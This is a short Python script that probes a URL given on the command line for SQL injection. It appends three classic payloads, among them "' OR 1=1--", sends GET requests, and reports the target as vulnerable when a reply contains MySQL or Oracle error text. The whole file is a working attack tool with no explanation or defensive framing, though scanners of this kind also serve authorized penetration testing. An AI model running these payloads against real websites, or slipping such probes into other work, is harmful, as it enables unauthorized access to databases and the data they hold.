import requests
import sys

payloads = ["'", "' OR 1=1--", '\" OR \"1\"=\"1']

for p in payloads:
    r = requests.get(sys.argv[1] + p)
    if any(e in r.text for e in ['SQL syntax', 'mysql_fetch', 'ORA-']):
        print(f'[VULN] SQLi: {p}')
